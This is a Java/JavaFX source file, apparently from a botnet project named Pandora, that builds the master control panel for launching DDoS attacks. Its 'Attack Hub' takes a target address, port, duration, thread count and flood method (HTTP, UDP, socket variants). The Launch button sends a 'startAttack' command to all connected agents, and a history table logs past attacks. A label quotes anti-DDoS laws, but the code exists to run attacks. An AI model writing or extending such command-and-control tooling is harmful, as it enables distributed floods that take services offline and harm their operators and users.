package org.pandora.master.scene.impl.menu;

import javafx.application.Platform;
import javafx.collections.FXCollections;
import javafx.collections.ObservableList;
import javafx.geometry.Insets;
import javafx.scene.Scene;
import javafx.scene.control.*;
import javafx.scene.layout.*;
import javafx.scene.paint.Color;
import lombok.Getter;
import org.pandora.master.Master;
import org.pandora.master.builder.BuilderManager;
import org.pandora.master.builder.impl.scene.BasicBuilder;
import org.pandora.master.data.attack.LogData;
import org.pandora.master.encoding.EncodingManager;
import org.pandora.master.utils.NumberUtils;
import org.pandora.master.utils.Settings;
import org.pandora.master.utils.SocketUtils;

import java.util.Timer;
import java.util.TimerTask;

public class DDoSUI {

    private int timer, id;
    @Getter
    private final BasicBuilder basicBuilder;
    @Getter
    private final Master master;
    @Getter
    private AnchorPane anchorPane;
    @Getter
    private Scene scene;
    @Getter
    private Label active;
    @Getter
    private final SocketUtils socketUtils;
    @Getter
    private final EncodingManager encodingManager;
    private final ObservableList<LogData> data;

    public DDoSUI(final Master master, final BasicBuilder basicBuilder) {
        this.basicBuilder = basicBuilder;
        this.master = master;
        this.socketUtils = master.getSocketUtils();
        this.encodingManager = master.getEncodingManager();
        this.data = FXCollections.observableArrayList();
        this.timer = 0;
        this.id = 0;
    }

    public void initialize() {
        final Scene scene = this.basicBuilder.getScene();
        final AnchorPane anchorPane = this.basicBuilder.getAnchorPane();
        final BuilderManager builderManager = this.basicBuilder.getBuilderManager();

        this.basicBuilder.getDdos().setId("currentNavButton");

        final Label lawText = builderManager.getLabelBuilder().buildLabel("Article 323-2 of the penal code: \"hindering or distorting the operation of an automated data processing system\". This article may be applied in the event of a \"denial of service\" attack. He\nis punishable by five years' imprisonment and a fine of 150,000 euros.\"When this offense was committed against an automated personal data processing system implemented by the State,\nthe penalty is increased to seven years' imprisonment and a fine of 300,000 euros\".\nThe Computer Misuse Act 1990 makes it illegal to intentionally impair the operation of a computer or prevent or hinder access to a program/data on a computer unless\nyou are authorised to do so. This means that Distributed denial of Service (DDoS) and similar types of attacks are criminal under UK law.\nThe Act also says it’s illegal to make, supply or obtain stresser or booter services in order to facilitate DDoS attacks.", 10, 562, Color.rgb(189, 190, 207), "Verdana", 11);
        this.active = builderManager.getLabelBuilder().buildLabel("No attack is currently in progress", 286, 68, Color.rgb(189, 190, 207), "Consolas", 16);
        this.active.setPrefSize(785, 59);
        lawText.setPrefSize(1060, 90);

        final Pane hubPane = builderManager.getPaneBuilder().buildPane(15, 149, 445, 389, new Background(new BackgroundFill(Color.rgb(26, 27, 36), CornerRadii.EMPTY, Insets.EMPTY)));
        final Pane logsPane = builderManager.getPaneBuilder().buildPane(475, 149, 590, 389, new Background(new BackgroundFill(Color.rgb(26, 27, 36), CornerRadii.EMPTY, Insets.EMPTY)));

        final Label hubTitle = builderManager.getLabelBuilder().buildLabel("Attack Hub", 24, 24, Color.rgb(189, 190, 207), "Verdana", 18);
        final Label addressLabel = builderManager.getLabelBuilder().buildLabel("Address/URL", 52, 67, Color.rgb(189, 190, 207), "Verdana", 13);
        final Label portLabel = builderManager.getLabelBuilder().buildLabel("Port", 52, 120, Color.rgb(189, 190, 207), "Verdana", 13);
        final Label timeLabel = builderManager.getLabelBuilder().buildLabel("Time", 52, 173, Color.rgb(189, 190, 207), "Verdana", 13);
        final Label threadsLabel = builderManager.getLabelBuilder().buildLabel("Threads", 52, 226, Color.rgb(189, 190, 207), "Verdana", 13);
        final Label methodLabel = builderManager.getLabelBuilder().buildLabel("Method", 52, 279, Color.rgb(189, 190, 207), "Verdana", 13);

        final TextField hostField = builderManager.getTextFieldBuilder().buildTextField("", "8.8.8.8", 170, 61, 223, 32);
        final TextField portField = builderManager.getTextFieldBuilder().buildTextField("", "80", 170, 114, 223, 32);
        final TextField timeField = builderManager.getTextFieldBuilder().buildTextField("", "120", 170, 167, 223, 32);
        final TextField threadsField = builderManager.getTextFieldBuilder().buildTextField("", "100", 170, 220, 223, 32);
        
        final ChoiceBox<?> methodChoice = builderManager.getChoiceBoxBuilder().buildChoiceBox(FXCollections.observableArrayList("LiteHTTP", "LiteSocket", "LiteUDP", "GET", "POST", "UDP", "SOCKET"), 170, 273, 223, 32);

        final Button launchButton = builderManager.getButtonBuilder().buildButton(null, "Launch", 52, 332, "WHITE", "Verdana", 12, 150, 32, "attack-button");
        final Button stopButton = builderManager.getButtonBuilder().buildButton(null, "Stop", 243, 332, "WHITE", "Verdana", 12, 150, 32, "attack-button");
        stopButton.setDisable(true);

        launchButton.setOnMouseClicked(event -> {
            if (this.timer >= 1) {
                System.out.println("[Attack] Attack is already in progress!");
                return;
            }
            final String address = hostField.getText();
            if (address == null || address.equals("")) {
                System.out.println("[Attack] Please complete correctly the following field : 'address'");
                return;
            }
            final String portStr = portField.getText();
            if (portStr == null || !NumberUtils.isInteger(portStr) || Integer.parseInt(portStr) < 0 || Integer.parseInt(portStr) > 65536) {
                System.out.println("[Attack] Please complete correctly the following field : 'port'");
                return;
            }
            final String timeStr = timeField.getText();
            if (timeStr == null || !NumberUtils.isInteger(timeStr) || Integer.parseInt(timeStr) < 1 || Integer.parseInt(timeStr) > 604800) {
                System.out.println("[Attack] Please complete correctly the following field : 'time'");
                return;
            }
            final String threadsStr = threadsField.getText();
            if (threadsStr == null || !NumberUtils.isInteger(threadsStr) || Integer.parseInt(threadsStr) < 1 || Integer.parseInt(threadsStr) > 65000) {
                System.out.println("[Attack] Please complete correctly the following field : 'threads'");
                return;
            }
            if (methodChoice.getValue() == null || methodChoice.getValue().equals("")) {
                System.out.println("[Attack] Please complete correctly the following field : 'method'");
                return;
            }
            final String method = methodChoice.getValue().toString();
            final int port = Integer.parseInt(portStr);
            final int time = Integer.parseInt(timeStr);
            final int threads = Integer.parseInt(threadsStr);

            launchButton.setDisable(true);
            this.getSocketUtils().write("all_agents", "startAttack:" + this.id + ":" + address.replace(":", "(doubleDot)") + ":" + port + ":" + time + ":" + method + ":" + threads + ":master-" + Settings.RANDOM);

            final LogData logData = new LogData(this.id, address, port, time, threads, method, true);
            this.getMaster().logData.add(logData);
            this.data.addAll(logData);
            this.id++;
            this.timer = time;
            this.active.setText("Attacking " + address + ":" + port + " for " + time + " second(s) with method " + method);
            stopButton.setDisable(false);

            final Timer task = new Timer();
            task.schedule(new TimerTask() {
                @Override
                public void run() {
                    Platform.runLater(() -> {
                        if (timer > 0) {
                            timer--;
                            active.setText("Attacking " + address + ":" + port + " for " + timer + " second(s) with method " + method);
                        } else if (timer == 0) {
                            getMaster().getLogManager().getLogData(id - 1).setActive(false);
                            stopButton.setDisable(true);
                            launchButton.setDisable(false);
                            active.setText("No attack is currently in progress");
                            task.cancel();
                        }
                    });
                }
            }, 0, 1000L);
        });

        stopButton.setOnMouseClicked(event -> {
            if (this.timer > 0) {
                this.getSocketUtils().write("all_agents", "stopAttack:" + (this.id - 1) + ":master-" + Settings.RANDOM);
                this.timer = 0;
            }
        });

        hostField.setId("attackField");
        portField.setId("attackField");
        timeField.setId("attackField");
        threadsField.setId("attackField");
        methodChoice.setId("methodChoice");

        final Label historyTitle = builderManager.getLabelBuilder().buildLabel("History", 24, 24, Color.rgb(189, 190, 207), "Verdana", 18);

        final TableView<LogData> logsView = (TableView<LogData>) builderManager.getTableViewBuilder().buildTableView("You haven't attacked since the last launch", Color.WHITE, 16, 306, 560, 15, 67, "logs-tableView");
        final TableColumn<LogData, String> idColumn = (TableColumn<LogData, String>) builderManager.getTableColumnBuilder().buildTableColumn("ID", 37, "id");
        final TableColumn<LogData, String> addressColumn = (TableColumn<LogData, String>) builderManager.getTableColumnBuilder().buildTableColumn("Address/URL", 185.6, "address");
        final TableColumn<LogData, String> portColumn = (TableColumn<LogData, String>) builderManager.getTableColumnBuilder().buildTableColumn("Port", 110.8, "port");
        final TableColumn<LogData, String> timeColumn = (TableColumn<LogData, String>) builderManager.getTableColumnBuilder().buildTableColumn("Time", 113.8, "time");
        final TableColumn<LogData, String> methodColumn = (TableColumn<LogData, String>) builderManager.getTableColumnBuilder().buildTableColumn("Method", 111.8, "method");

        logsView.setItems(this.data);
        logsView.getColumns().addAll(idColumn, addressColumn, portColumn, timeColumn, methodColumn);
        logsView.requestLayout();

        hubPane.getChildren().addAll(hubTitle, addressLabel, portLabel, timeLabel, threadsLabel, methodLabel, hostField, portField, timeField, threadsField, launchButton, stopButton, methodChoice);
        logsPane.getChildren().addAll(historyTitle, logsView);
        anchorPane.getChildren().addAll(this.active, lawText, hubPane, logsPane);
        this.anchorPane = anchorPane;
        this.scene = scene;
    }
}
